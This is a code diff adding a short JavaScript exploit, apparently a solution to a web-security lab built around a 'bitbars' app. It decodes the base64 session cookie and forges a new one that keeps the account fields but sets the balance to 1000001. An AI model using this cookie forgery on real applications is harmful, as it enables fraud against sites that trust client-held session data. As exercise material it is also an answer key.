@@ -1,0 +1,15 @@
+const myCookie = JSON.parse(atob(document.cookie.substr(8)));
+
+const fakeInfo = {
+	"loggedIn":true,
+	"account":{
+		"username":myCookie.account.username,
+		"hashedPassword":myCookie.account.hashedPassword,
+		"salt":myCookie.account.salt,
+		"profile":myCookie.account.profile,
+		"bitbars":1000001
+	}
+};
+const fakeInfoBase64 = btoa(JSON.stringify(fakeInfo));
+const fakeCookie = 'session='+ fakeInfoBase64;
+document.cookie = fakeCookie;
